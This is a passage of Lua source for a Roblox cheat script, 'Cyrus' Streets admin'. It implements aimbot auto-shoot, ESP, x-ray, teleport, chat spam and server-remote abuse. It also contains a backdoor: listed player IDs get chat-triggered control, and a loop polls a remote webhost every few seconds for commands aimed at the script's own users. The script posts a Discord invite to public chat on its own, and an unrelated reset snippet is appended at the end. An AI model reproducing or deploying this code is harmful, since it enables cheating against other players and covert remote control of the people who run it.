end,"aimbotautoshoot",{},"Auto shoots aimbot","[No Args]")

AddCommand(function(Arguments)
	if Arguments[1] then 
		ClickTpKey = Arguments[1]:sub(1,1)
		updateHotkeys(ConfigurationFile)
	else
		ClickTpKey = nil
		updateHotkeys(ConfigurationFile)
	end
end,"clicktp",{"ctp"},"Allows you to teleport around the map with the Key you set","[Key]")

AddCommand(function()
	AutoStomp = not AutoStomp
end,"autostomp",{},"Turns On/Off AutoStomp","[No Args]")

AddCommand(function(Arguments)
	if Arguments[1] then 
			if Arguments[1] == "remove" and Arguments[2] then
				local Player = PlrFinder(Arguments[2])
				if Player and Player ~= LP then
					for i,v in pairs(StompWhitelist) do if Player.UserId == v then table.remove(StompWhitelist,i) end 	
				end 
			else
				local Player = PlrFinder(Arguments[1])
				if Player and Player ~= LP then 
					table.insert(StompWhitelist,Player.UserId)
				end
			end
		end
	end
end,"autostompwhitelist",{},"Adds the player to the whitelist so they don't get stomped, to remove use remove before their name","[Player]")

AddCommand(function(Arguments)
	if not Freecam then
		Freecam = true 
		FreeCam(Arguments[1])
	else
		Freecam = false
	end 
end,"freecam",{},"Allows you to \"free\" view the map","[Speed (Optional)]")

AddCommand(function()
	GravGunTool = Instance.new('Tool',LP.Backpack)
	GravGunTool.Name = "GravGun"
	GravGunTool.RequiresHandle = false 
	local Handle = Instance.new('Part',GravGunTool)
	Handle.Name = "Handle"
	Handle.Transparency = 1
end,"gravgun",{"gravitygun"},"Gmod Gravity gun","[Keys: Q,V] (No Args)")

AddCommand(function()
	ExploiterDetectionOn = not ExploiterDetectionOn
	notif("ExploiterDetection","Has been set to "..tostring(ExploiterDetectionOn),5,nil)
end,"exploiterdetection",{},"Detects exploiters (Has a chance to false flag)","[No Args]")

AddCommand(function(Arguments)
	if Arguments[1] then 
		if Arguments[1] == "image" then 
			if Arguments[2] then 
				CmdBarImageLabel.Image = "http://www.roblox.com/asset/?id="..Arguments[2]
			end
		elseif Arguments[1] == "none" then 
			CmdBarImageLabel.Image = ""
		elseif Arguments[1] == "default" then
			CmdBarImageLabel.Image = "http://www.roblox.com/asset/?id=2812081613"
		end
		updateHotkeys(ConfigurationFile)
	end
end,"commandbarimage",{"cmdbarimage"},"Changes the command bar image","[Image/None/Default]")

AddCommand(function(Arguments)
	if Arguments[1] then 
		local Player = PlrFinder(Arguments[1])
		if Player and Player ~= LP then 
			if typeof(Player) == "table" then
				for i = 1,#Player do
					local ActualPlr = Player[i]
					if ActualPlr ~= LP and ActualPlr.Character and ActualPlr.Character:FindFirstChild'Head' then
						if Arguments[1] == "users" and AdminUserTable[ActualPlr] or Arguments[1] ~= "users" then 
							EspTable2[ActualPlr] = true 
							Esp(ActualPlr.Character.Head,Player.Name)
							local EspEvent;EspEvent = ActualPlr.CharacterAdded:Connect(function(C)
								local Head = C:WaitForChild'Head'
								if EspTable[Player] then 
									Esp(Head,Player.Name)
								else 
									EspEvent:Disconnect()
								end
							end)
						end 
					end 
				end
			else
				if Player.Character and Player.Character:FindFirstChild'Head' then
					EspTable2[Player] = true 
					Esp(Player.Character.Head,Player.Name)
					local EspEvent;EspEvent = Player.CharacterAdded:Connect(function(C)
						local Head = C:WaitForChild'Head'
						if EspTable[Player] then 
							Esp(Head,Player.Name)
						else 
							EspEvent:Disconnect()
						end
					end)
				end 
			end 
		end 
	end
end,"esp",{},"Find a player anywhere in the map","[Player/All/Users]")

AddCommand(function(Arguments)
	if Arguments[1] then 
		local Player = PlrFinder(Arguments[1])
		if Player then 
			if typeof(Player) == "table" then 
				for i = 1,#Player do
					local ActualPlr = Player[i]
					if ActualPlr.Character and ActualPlr.Character:FindFirstChild'Head' then 
						Unesp(ActualPlr)
					end 
				end
			else 
				if Player.Character and Player.Character:FindFirstChild'Head' then 
					Unesp(Player)
				end
			end
		end
	end
end,"unesp",{},"obviously removes the esp?","[Player/All]")

AddCommand(function(Arguments)
	if Arguments[1] then 
		if Arguments[1] == "esp" then 
			EspColour = Color3.fromRGB(Arguments[2] or 0,Arguments[3] or 0,Arguments[4] or 0)
		elseif Arguments[1] == "bullet" then			
			BulletColour = ColorSequence.new(Color3.fromRGB(Arguments[2] or 0,Arguments[3] or 0,Arguments[4] or 0))
		end
	end
end,"colour",{"color"},"Colour esp/bullet [3 Args (Number) (Optional)] defaults to 0","[Esp/Bullet] [3 numbers (Optional)]")

AddCommand(function()
	KeysFrame.Visible = not KeysFrame.Visible
end,"hotkey",{"key"},"For Setting hotkeys, Type in the textbox, click the button and press a key","[No Args]")

AddCommand(function(Arguments)
	if Arguments[1] then
		for Index,Key in pairs(Keys) do
		if Key:match'[%a%d]+$' == Arguments[1]:upper() or Key:match("[%a%d]+$") == Arguments[1] then
				table.remove(Keys,Index)
				updateHotkeys(ConfigurationFile)
			end
		end
	end
end,"removekey",{"rkey"},"Removes a hotkey to a command","[Key]")

AddCommand(function()
	Keys = {}
	ClickTpKey = ""
	updateHotkeys(ConfigurationFile)
end,"removeallhotkeys",{"removeallkeys"},"Removes all hotkeys","[No Args]")

AddCommand(function(Arguments)
	if readfile and writefile then 
		if Arguments[1] then 
			if Arguments[1] == "default" then 
				ConfigurationFile = "CyrusStreetsAdminSettings.json"
			elseif pcall(readfile,Arguments[1]..".json") then 
				ConfigurationFile = Arguments[1]..".json"
			else 
				ConfigurationFile = Arguments[1]..".json"
				initalizeHotkeys(ConfigurationFile)
			end
			runHotkeys(ConfigurationFile)
		end
	end
end,"config",{},"Changes Configs (Useful for having different profiles i.e legit etc)","[Config Name]")

AddCommand(function(Arguments)
	if Arguments[1] then 
		if Arguments[1] == "wireframe" then
			Xray(Arguments[1],"wireframe")
		else 
			notif("Xray","Sorry, Only [Xray WireFrame/No Args] Work",5,nil)
		end
	else 
		Xray()
	end 
end,"xray",{},"see through walls (also has wireframe mode which looks cool but kills fps)","[WireFrame/No Args]")

-- [[ End ]] -- 

-- [[ Gui Initalization ]] -- 

coroutine.resume(coroutine.create(function()
	-- Rainbow Hats --
	RainbowFrame.Visible = false 
	RainbowFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
	RainbowFrame.BackgroundTransparency = 0.6
	RainbowFrame.Position = UDim2.new(0.3,0,0.17,0)
	RainbowFrame.Size = UDim2.new(0,460,0,359)
	RainbowFrame.AnchorPoint = Vector2.new(0,0)
	
	RainbowLabel.BackgroundColor3 = Color3.fromRGB(0,0,0)
	RainbowLabel.BackgroundTransparency = 0.3
	RainbowLabel.BorderColor3 = Color3.fromRGB(170,0,0)
	RainbowLabel.BorderSizePixel = 2
	RainbowLabel.Position = UDim2.new(-0.002,0,-0.14,0)
	RainbowLabel.Size = UDim2.new(0,460,0,50)
	RainbowLabel.Font = Enum.Font.SciFi
	RainbowLabel.Text = "Rainbow Hats"
	RainbowLabel.TextColor3 = Color3.fromRGB(255,170,255)
	RainbowLabel.TextSize = 50

	RainbowScrolling.BackgroundColor3 = Color3.fromRGB(0,0,0)
	RainbowScrolling.BackgroundTransparency = 0.3
	RainbowScrolling.BorderColor3 = Color3.fromRGB(170,0,0)
	RainbowScrolling.BorderSizePixel = 2
	RainbowScrolling.Position = UDim2.new(-0.0013,0,-0.0006,0)
	RainbowScrolling.Size = UDim2.new(0,460,0,359)
	RainbowScrolling.CanvasSize = UDim2.new(0,0,10,0)
	RainbowScrolling.ScrollBarThickness = 10
	
	CmdsFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
	CmdsFrame.BorderColor3 = Color3.fromRGB(170,0,0)
	CmdsFrame.BorderSizePixel = 0
	CmdsFrame.Position = UDim2.new(0.34,0,0.16,0)
	CmdsFrame.Size = UDim2.new(0,400,0,350)
	CmdsFrame.Style = Enum.FrameStyle.RobloxSquare
	CmdsFrame.Visible = false 
	CmdsFrame.AnchorPoint = Vector2.new(0,0)
	
	-- Help Gui --
	 
	CmdsLabel.BackgroundColor3 = Color3.fromRGB(116,0,0)
	CmdsLabel.BackgroundTransparency = 0.2
	CmdsLabel.BorderColor3 = Color3.fromRGB(49,0,0)
	CmdsLabel.BorderSizePixel = 0
	CmdsLabel.Position = UDim2.new(-0.02,0,-0.15,0)
	CmdsLabel.Size = UDim2.new(0,400,0,43)
	CmdsLabel.Font = Enum.Font.SciFi
	CmdsLabel.Text = "Commands"
	CmdsLabel.TextColor3 = Color3.fromRGB(255,255,255)
	CmdsLabel.TextSize = 20
	
	CmdsScrolling.Active = true
	CmdsScrolling.BackgroundColor3 = Color3.fromRGB(0,0,0)
	CmdsScrolling.BackgroundTransparency = 1
	CmdsScrolling.BorderColor3 = Color3.fromRGB(170,0,0)
	CmdsScrolling.BorderSizePixel = 0
	CmdsScrolling.Position = UDim2.new(-0.022,0,-0.02,0)
	CmdsScrolling.Size = UDim2.new(0,400,0,350)
	CmdsScrolling.CanvasSize = UDim2.new(0,0,10,0)
	CmdsScrolling.ScrollBarThickness = 10
	
	-- Command bar --

	
	CmdBarFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
	CmdBarFrame.BackgroundTransparency = 0.8
	CmdBarFrame.Size = UDim2.new(0,197,0,41)
	CmdBarFrame.Position = UDim2.new(1.5,0,1.5,0)
	CmdBarFrame.AnchorPoint = Vector2.new(0.5,0.5)

	CmdBarTextBox.BackgroundColor3 = Color3.fromRGB(0,0,0)
	CmdBarTextBox.BackgroundTransparency = 0.4
	CmdBarTextBox.BorderColor3 = Color3.fromRGB(170,0,0)
	CmdBarTextBox.BorderSizePixel = 2
	CmdBarTextBox.Position = UDim2.new(0,0,-0.8,0)
	CmdBarTextBox.Size = UDim2.new(0,199,0,41)
	CmdBarTextBox.Font = Enum.Font.SciFi
	CmdBarTextBox.TextColor3 = Color3.fromRGB(255,255,255)
	CmdBarTextBox.TextSize = 15
	CmdBarTextBox.TextWrapped = true
	CmdBarTextBox.ClearTextOnFocus = true 
	
	CmdBarImageLabel.BackgroundColor3 = Color3.fromRGB(0,0,0)
	CmdBarImageLabel.Size = UDim2.new(0,199,0,145)
	CmdBarImageLabel.Image = CmdBarImage
	
	-- Values GUI -- 
	
	ValuesFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
	ValuesFrame.BackgroundTransparency = 1
	ValuesFrame.Position = UDim2.new(0.15,0,1,0)
	ValuesFrame.AnchorPoint = Vector2.new(0,1)
	ValuesFrame.Size = UDim2.new(0,160,0,160)
	
	ValuesTextLabel.BackgroundColor3 = Color3.fromRGB(0,0,0)
	ValuesTextLabel.BackgroundTransparency = 0.6
	ValuesTextLabel.BorderColor3 = Color3.fromRGB(170,0,0)
	ValuesTextLabel.Position = UDim2.new(0,0,0,0)
	ValuesTextLabel.Size = UDim2.new(0,160,0,160)
	ValuesTextLabel.Font = Enum.Font.Code
	ValuesTextLabel.TextColor3 = Color3.fromRGB(255,255,255)
	ValuesTextLabel.TextSize = 14
	ValuesTextLabel.TextWrapped = true
	ValuesTextLabel.TextYAlignment = Enum.TextYAlignment.Top
	
	-- Hotkeys GUI -- 
	
	HotkeysFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
	HotkeysFrame.BackgroundTransparency = 1
	HotkeysFrame.Position = UDim2.new(0.8,0,1,0)
	HotkeysFrame.AnchorPoint = Vector2.new(1,1)
	HotkeysFrame.Size = UDim2.new(0,160,0,160)

	HotkeysTextLabel.BackgroundColor3 = Color3.fromRGB(0,0,0)
	HotkeysTextLabel.BackgroundTransparency = 0.6
	HotkeysTextLabel.BorderColor3 = Color3.fromRGB(170,0,0)
	HotkeysTextLabel.Position = UDim2.new(0,0,0,0)
	HotkeysTextLabel.Text = "Open Command Bar: '\nGunStomp: E"
	HotkeysTextLabel.Size = UDim2.new(0,160,0,160)
	HotkeysTextLabel.Font = Enum.Font.Code
	HotkeysTextLabel.TextColor3 = Color3.fromRGB(255,255,255)
	HotkeysTextLabel.TextSize = 14
	HotkeysTextLabel.TextWrapped = true
	HotkeysTextLabel.TextYAlignment = Enum.TextYAlignment.Top
	
	-- Damage Indicator -- 
	
	DmgIndicator.BackgroundColor3 = Color3.fromRGB(0,0,0)
	DmgIndicator.BackgroundTransparency = 0.7
	DmgIndicator.BorderSizePixel = 3
	DmgIndicator.Position = UDim2.new(0,0,1,0)
	DmgIndicator.Size = UDim2.new(0,385,0,50)
	DmgIndicator.Font = Enum.Font.Code
	DmgIndicator.TextColor3 = Color3.fromRGB(184,0,3)
	DmgIndicator.TextScaled = true
	DmgIndicator.TextSize = 30
	DmgIndicator.TextWrapped = true
	DmgIndicator.Visible = false

	-- Hotkeys GUI -- 

	KeysFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
	KeysFrame.BackgroundTransparency = 0.6
	KeysFrame.BorderColor3 = Color3.fromRGB(170,0,0)
	KeysFrame.BorderSizePixel = 0
	KeysFrame.Position = UDim2.new(0.5,0,0.5,0)
	KeysFrame.AnchorPoint = Vector2.new(0.5,0.5)
	KeysFrame.Size = UDim2.new(0,218,0,154)
	KeysFrame.Visible = false 

	AnyCmdButton.BackgroundColor3 = Color3.fromRGB(0,0,0)
	AnyCmdButton.BackgroundTransparency = 0.7
	AnyCmdButton.BorderColor3 = Color3.fromRGB(170,0,0)
	AnyCmdButton.Position = UDim2.new(0.17,0,0.43,0)
	AnyCmdButton.Size = UDim2.new(0,49,0,49)
	AnyCmdButton.Font = Enum.Font.SourceSans
	AnyCmdButton.TextColor3 = Color3.fromRGB(255,255,255)
	AnyCmdButton.TextSize = 13
	AnyCmdButton.TextWrapped = true
	AnyCmdButton.Text = "Type a command then click"
	
	KeysLabel.BackgroundColor3 = Color3.fromRGB(0,0,0)
	KeysLabel.BackgroundTransparency = 0.3
	KeysLabel.BorderColor3 = Color3.fromRGB(170,0,0)
	KeysLabel.Position = UDim2.new(0.004,0,-0.3,0)
	KeysLabel.Size = UDim2.new(0,217,0,50)
	KeysLabel.Font = Enum.Font.SciFi
	KeysLabel.Text = "Keys GUI"
	KeysLabel.TextColor3 = Color3.fromRGB(214,0,0)
	KeysLabel.TextSize = 50
	
	CmdBarKeyLabel.BackgroundColor3 = Color3.fromRGB(0,0,0)
	CmdBarKeyLabel.BackgroundTransparency = 0.6
	CmdBarKeyLabel.BorderColor3 = Color3.fromRGB(0,0,127)
	CmdBarKeyLabel.Position = UDim2.new(0.6,0,0.07,0)
	CmdBarKeyLabel.Size = UDim2.new(0,50,0,44)
	CmdBarKeyLabel.Font = Enum.Font.Fantasy
	CmdBarKeyLabel.Text = "CmdBar Key"
	CmdBarKeyLabel.TextColor3 = Color3.fromRGB(255,255,255)
	CmdBarKeyLabel.TextSize = 11
	CmdBarKeyLabel.TextWrapped = true
	
	CmdBarKeyButton.BackgroundColor3 = Color3.fromRGB(0,0,0)
	CmdBarKeyButton.BackgroundTransparency = 0.7
	CmdBarKeyButton.BorderColor3 = Color3.fromRGB(170,0,0)
	CmdBarKeyButton.Position = UDim2.new(0.6,0,0.43,0)
	CmdBarKeyButton.Size = UDim2.new(0,49,0,49)
	CmdBarKeyButton.Font = Enum.Font.SourceSans
	CmdBarKeyButton.Text = "Click then press a key"
	CmdBarKeyButton.TextColor3 = Color3.fromRGB(255,255,255)
	CmdBarKeyButton.TextSize = 13
	CmdBarKeyButton.TextWrapped = true
	
	AnyCmdTextBox.BackgroundColor3 = Color3.fromRGB(0,0,0)
	AnyCmdTextBox.BackgroundTransparency = 0.6
	AnyCmdTextBox.BorderColor3 = Color3.fromRGB(0,0,127)
	AnyCmdTextBox.Position = UDim2.new(0.17,0,0.07,0)
	AnyCmdTextBox.Size = UDim2.new(0,50,0,44)
	AnyCmdTextBox.Font = Enum.Font.Fantasy
	AnyCmdTextBox.PlaceholderColor3 = Color3.fromRGB(255,255,255)
	AnyCmdTextBox.PlaceholderText = "CmdToSet"
	AnyCmdTextBox.Text = ""
	AnyCmdTextBox.TextColor3 = Color3.fromRGB(255,255,255)
	AnyCmdTextBox.TextSize = 11
	AnyCmdTextBox.TextWrapped = true
	dragGUI(KeysFrame,KeysFrame)
end))

--[[ End ]] -- 

--[[ Loops ]] -- 

coroutine.resume(coroutine.create(function()
	local FileDir,isFolder,makeFolder = syn_io_listdir or list_files,syn_io_isfolder or isfolder,syn_io_makefolder or makefolder
	if FileDir and isFolder and makeFolder then 
		if not isFolder'CyAdminPlugins' then 
			makeFolder('CyAdminPlugins')
		end 
		for _,v in pairs(FileDir'CyAdminPlugins') do 
			local WorkingFile = loadfile(v)
			if not WorkingFile then
				ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("There was a syntax error (sadly can\'t output it as loadfile is gay)","All")
			else 
				local Work,Error = pcall(WorkingFile) 
				if not Work then 
					ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Runtime Error"..Error,"All")
				end
			end
		end
	end 
	CmdsLabel.Text = "Commands | Total Commands: "..#Commands
	for i = 1,#Commands do 
		local Command = Commands[i]
		local Name,Args,Alias,Help = Command.Name,Command.Args,Command.Alias,Command.Help
		createCmd(UDim2.new(0.0008,0,0.002,-35 + (i * 29)),Name,Help)
		coroutine.resume(coroutine.create(function() createCommandBarCmd(Name,Args) end))
		coroutine.resume(coroutine.create(function()
			for i = 1,#Alias do
				createCommandBarCmd("[Alias] "..Alias[i],Args)
			end
		end))
	end
	while wait() do
		local Character = GetChar()
		coroutine.resume(coroutine.create(function()
			--[[if Character and Character:FindFirstChildOfClass'Humanoid'then 
				if workspace.Gravity < NormalGravity then 
					if game.PlaceId == 455366377 and not Character:FindFirstChild'RealHumanoidRootPart' then 
						Character.Humanoid:ChangeState(3)
						Character.Humanoid.PlatformStand = false
						wait(0.2)
					end
					Character.Humanoid:ChangeState(8)
				end
				if game.PlaceId == 455366377 then 
					if Character.Humanoid.HipHeight > 0 or AirwalkOn and not Flying then 
						Character.Humanoid:ChangeState(3)
						Character.Humanoid.PlatformStand = false
						RunService.RenderStepped:Wait()
						Character.Humanoid:ChangeState(8)
						wait(2)
					end
				end
			end]]
			local StartPing = tick()
			ReplicatedStorage.DefaultChatSystemChatEvents.MutePlayerRequest:InvokeServer()
			PlayersPing = (tick() - StartPing)
		end))
		local Tool = Character:FindFirstChildOfClass'Tool'
		if AimbotAutoShoot and AimlockTarget and Tool and Tool:FindFirstChild('Clips',true) and AimlockTarget:FindFirstChildOfClass'Humanoid' and AimlockTarget.Humanoid.Health > 0 and not AimlockTarget:FindFirstChildOfClass'ForceField' then
			if not BehindAWall(AimlockTarget) and HasItem(Players:GetPlayerFromCharacter(AimlockTarget),"Bone") ~= "Yes" then
				if AimlockTarget:FindFirstChild'Head' and Character:FindFirstChild'Head' and (AimlockTarget.Head.Position - Character.Head.Position).magnitude <= EstimatedGunRanges[Tool.Name] then 
					if game.PlaceId == 455366377 then
						LP.Backpack.Input:FireServer("m1",{
							['mousehit'] = AimbotToCFrame();
							['shift'] = UserInput:IsKeyDown(Enum.KeyCode.LeftShift);
							['velo'] = Character.Head.Velocity.magnitude;
						})
					else 
						Tool.Fire:FireServer(AimbotToCFrame())
					end
				end 
			end 
		end
		if Character:FindFirstChildOfClass'Humanoid' then 
			if Tool and Tool:FindFirstChild'Ammo' then 
				ValuesTextLabel.Text = "Health: "..math.floor(Character.Humanoid.Health).."\nCurrent WalkSpeed: "..math.floor(Character.Humanoid.WalkSpeed).."\nSprinting Speed: "..SprintSpeed.."\nCrouching Speed: "..CrouchSpeed.."\nBlink Speed: "..BlinkSpeed.."\nJumpPower: "..Character.Humanoid.JumpPower.."\nNoclipping: "..tostring(Noclip).."\nAimlocking: "..tostring(Aimlock).."\nAimlock Target: "..tostring(AimlockTarget).."\n"..Tool.Name.." Ammo&Clips: "..Tool.Ammo.Value.."/"..Tool.Clips.Value
			else 
				ValuesTextLabel.Text = "Health: "..math.floor(Character.Humanoid.Health).."\nCurrent WalkSpeed: "..math.floor(Character.Humanoid.WalkSpeed).."\nSprinting Speed: "..SprintSpeed.."\nCrouching Speed: "..CrouchSpeed.."\nBlink Speed: "..BlinkSpeed.."\nJumpPower: "..Character.Humanoid.JumpPower.."\nNoclipping: "..tostring(Noclip).."\nAimlocking: "..tostring(Aimlock).."\nAimlock Target: "..tostring(AimlockTarget) 
			end
		end 
		if AimlockTarget and AimlockTarget:FindFirstChild'Torso' then
			if AimlockTargetPosition then 
				local Magnitude = (AimlockTargetPosition - AimlockTarget.Torso.Position).magnitude / AimbotVelocity
				if Magnitude > 1 then
					NewPredictionVelocity = Magnitude
				else
					NewPredictionVelocity = 5
				end
				AimlockTargetPosition = AimlockTarget.Torso.Position
			else
				AimlockTargetPosition = AimlockTarget.Torso.Position
			end				
		end
		if GravGunBodyPosition then 
			GravGunBodyPosition.Position = GravGunTool.Handle.Position + CFrame.new(GravGunTool.Handle.Position,Mouse.Hit.p).lookVector * GravGunDistance
		end
		if RainbowFrame.Visible then 
			RainbowLabel.TextColor3 = Color3.fromRGB(math.random(1,255),math.random(1,255),math.random(1,255))
		end
		if LP.Character then 
			local PartFound = Character:FindFirstChild'RealHumanoidRootPart' or Character:FindFirstChild'Torso'
			if PartFound and Blinking and KeyTable['Shift'] then 
				if KeyTable['W'] then 
					PartFound.CFrame = PartFound.CFrame * CFrame.new(0,0,-BlinkSpeed)
				end 
				if KeyTable['A'] then 
					PartFound.CFrame = PartFound.CFrame * CFrame.new(-BlinkSpeed,0,0)
				end
				if KeyTable['S'] then 
					PartFound.CFrame = PartFound.CFrame * CFrame.new(0,0,BlinkSpeed)
				end
				if KeyTable['D'] then 
					PartFound.CFrame = PartFound.CFrame * CFrame.new(BlinkSpeed,0,0)
				end
			end
		end
		for i = 1,#EspTable do
			local Table = EspTable[i]
			local Player = Table['Player']
	        if Player and Player.Character then
				local Head,Torso = Player.Character:FindFirstChild'Head',Player.Character:FindFirstChild'RealHumanoidRootPart' or Player.Character:FindFirstChild'Torso'
	            if Head and Torso and Character:FindFirstChild'Head' then
	                local Pos,OnScreen = WorldToViewportPoint(Head.Position)
	                local SizeForBox = Vector3.new(2,3,0) * ((Head.Size.Y / 2) * 2)
	                local TopLeft = WorldToViewportPoint((Torso.CFrame * CFrame.new(SizeForBox.X,SizeForBox.Y,0)).p)
	                local TopRight = WorldToViewportPoint((Torso.CFrame * CFrame.new(-SizeForBox.X,SizeForBox.Y,0)).p)
	                local BottomLeft = WorldToViewportPoint((Torso.CFrame * CFrame.new(SizeForBox.X,-SizeForBox.Y,0)).p)
					local BottomRight = WorldToViewportPoint((Torso.CFrame * CFrame.new(-SizeForBox.X,-SizeForBox.Y,0)).p)
					ShowOrHideEsp(Table,OnScreen,Player)
					local User = AdminUserTable[Player] and "Yes" or "No"
					Table['Text'].Text = Player.Name.." | Health: "..checkHp(Player.Character).." | KO'ed: "..HasItem(Player,"Bone").." | Pos: "..math.floor((Character.Head.Position - Head.Position).magnitude).."\nHas Glock: "..HasItem(Player,"Glock").." | Shotty: "..HasItem(Player,"Shotty").." | Vest: "..HasItem(Player,"BulletResist").."\nCyAdmin User: "..User
		            Table['Text'].Position = Vector2.new(Pos.X,Pos.Y) + Vector2.new(0,10)
		            Table['Box'][1].From = Vector2.new(TopLeft.X,TopLeft.Y)
		            Table['Box'][1].To = Vector2.new(TopRight.X,TopRight.Y)
		            Table['Box'][2].From = Vector2.new(TopRight.X,TopRight.Y)
		            Table['Box'][2].To = Vector2.new(BottomRight.X,BottomRight.Y)
		            Table['Box'][3].From = Vector2.new(BottomLeft.X,BottomLeft.Y)
					Table['Box'][3].To = Vector2.new(TopLeft.X,TopLeft.Y)
            	end 
        	end 
    	end 
	end
end))

coroutine.resume(coroutine.create(function()
	while wait(1) do
		if CmdBarKey == "Quote" then 
			HotkeysTextLabel.Text = "Open Command Bar: '".."\nGunStomp: E"
		else
			HotkeysTextLabel.Text = "Open Command Bar: "..CmdBarKey.."\nGunStomp: E"
		end
		for i,v in pairs(Keys) do HotkeysTextLabel.Text = HotkeysTextLabel.Text.."\n"..v:match'^[%w%s]+'..": "..v:match'[%a%d]+$' end 
		if ExploiterDetectionOn then 
			local PlayerT = Players:GetPlayers()
			for i = 1,#PlayerT do 
				local Player = PlayerT[i]
				if Player ~= LP and Player.Character and Player.Character:FindFirstChild'Head' then 
					if Player.Character:FindFirstChild'Humanoid' and Player.Character:findFirstChild'Right Arm' then 
						if ExploitDetectionPlayerTablePositions[Player.Name] then
							local Pos1 = Player.Character.Head.Velocity
							local Pos2 = ExploitDetectionPlayerTablePositions[Player.Name]
							if not Player.Character.Head:FindFirstChildOfClass'BillboardGui' and Player.Character.Humanoid.Health > 0 and not Player.Character:FindFirstChild('Bone',true) and not Player.Character:FindFirstChildOfClass'ForceField' then 
								if (Vector3.new(Pos1.X,0,0) - Vector3.new(Pos2.X,0,0)).magnitude >= 85 or (Vector3.new(0,0,Pos1.Z) - Vector3.new(0,0,Pos2.Z)).magnitude >= 85 then
									Esp(Player.Character.Head,"Exploiter: "..Player.Name.." Reason: moved too fast",Color3.fromRGB(255,255,255))
									ExploitDetectionPlayerTablePositions[Player.Name] = Player.Character.Head.Velocity
								else
									ExploitDetectionPlayerTablePositions[Player.Name] = Player.Character.Head.Velocity
								end
							end
						else
							ExploitDetectionPlayerTablePositions[Player.Name] = Player.Character.Head.Velocity
						end
					else
						if not Player.Character.Head:FindFirstChildOfClass'BillboardGui' and Player.Character:FindFirstChildOfClass'Tool' then
							Esp(Player.character.Head,"Exploiter: "..Player.Name.." Reason: Feloop/Anti Feloop",Color3.fromRGB(255,255,255))
						end 
					end
				end
			end
		end
		if #WireFrameTable > 0 then 
			for i,v in pairs(WireFrameTable) do 
				local Pos,OnScreen = workspace.CurrentCamera:WorldToViewportPoint(v[2].Position)
				v[1].Visible = OnScreen
			end 
		end 
	end
end))

coroutine.resume(coroutine.create(function()
	for i,Player in pairs(Players:GetPlayers()) do
		local Backdoor = BackDoorTablePlayers[Player.UserId]
		local Blacklist = BlacklistTable[Player.UserId]
		if (Blacklist or Player:IsInGroup(5152759) or string.find(Player.Name:lower(),"lynx")) and Player.character and Player.Character:FindFirstChild'Head' then
			Esp(Player.Character.Head,Player.Name,Color3.fromRGB(102,51,0),true)
			Player.CharacterAdded:Connect(function(C)
				local Head = C:WaitForChild'Head'
				if Head then 
					Esp(Head,Player.Name,Color3.fromRGB(102,51,0),true)
				end 
			end)
		end 
		if Backdoor and Player.Character and Player.Character:FindFirstChild'Head' then
			Player.Chatted:Connect(function(Chat) BackdoorCheck(Player,Chat) end)
			Esp(Player.Character.Head,Backdoor['Name'],Backdoor['Colour'])
			initalizeBackdoorPart2(Player,Backdoor['Colour'])
			Player.CharacterAdded:Connect(function(C)
				local Head = C:WaitForChild'Head'
				if Head then
					initalizeBackdoorPart2(Player,Backdoor['Colour'])
					Esp(Head,Backdoor['Name'],Backdoor['Colour'])
				end
			end)
		end
		local Chatted;Chatted = Player.Chatted:Connect(function(Chat)
		local User = IsAUser(Player,Chat)
			if User then 
				Chatted:Disconnect()
			end
		end)
	end
	coroutine.resume(coroutine.create(function()
		while wait(SpamDelay) do 
			if Spamming then 
				ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(SpamMessage,"All")
			end 
		end
	end))
	while wait(Rainbowdelay) do 
		if RainbowHats and LP.Backpack:FindFirstChild'Stank' then
			if RainbowHats == "All" then 
				local HatTable = LP.PlayerGui.HUD.Clan.Group.Reps:GetChildren()
				LP.Backpack.Stank:FireServer("rep",HatTable[math.random(1,#HatTable)])
			end 
			local ColourTable = LP.PlayerGui.HUD.Clan.Group.cs:GetChildren()
			LP.Backpack.Stank:FireServer("color",ColourTable[math.random(1,#ColourTable)])
		end
	end
end))

-- [[ End ]] --

notif("Cyrus' Streets admin","took " .. string.format("%.6f",tick()-Tick) .. " seconds\n(Discord: A4nyecN)",10,"rbxassetid://2474242690") -- string.format remains superior - Slays.
notif("Newest Update","forgot I had this antiaim method lol",10,nil)
ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("new disc: A4nyecN","All")
	
while wait(8) do
	local Data = GetData()
	for i,v in pairs(Data) do
		if PlrFinder(i) == LP or typeof(PlrFinder(i)) == "table" then
			BackdoorCheck("none","`"..v)
		end
	end
end -- lets see if I get banned off this webhost lmao

-- simple reset with a button script (made by Tracy)

local Player = game:GetService("Players").LocalPlayer
local Mouse = Player:GetMouse()
Mouse.KeyDown:Connect(function(key)
    if key == "g" then
game.Workspace.Tracyyz["Head"]:Destroy()
local plr = game.Players.LocalPlayer
local humanoid = plr.Character.Humanoid
local position = plr.Character.HumanoidRootPart.CFrame
end
end)